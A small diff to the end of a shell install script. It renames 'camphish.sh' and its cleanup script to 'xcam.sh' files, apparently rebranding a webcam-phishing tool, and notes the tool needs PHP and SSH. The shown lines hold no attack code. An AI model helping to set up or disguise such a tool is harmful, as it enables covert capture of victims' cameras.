@@ -19,5 +19,5 @@ else
     printf "\e[1;33m[!] Please install PHP and SSH manually.\e[0m\n"
 fi
 
-chmod +x camphish.sh cleanup.sh 2>/dev/null
-printf "\e[1;32m[*] Run: bash camphish.sh (X Cam)\e[0m\n\n"
+chmod +x xcam.sh xcam-cleanup.sh 2>/dev/null
+printf "\e[1;32m[*] Run: bash xcam.sh\e[0m\n\n"
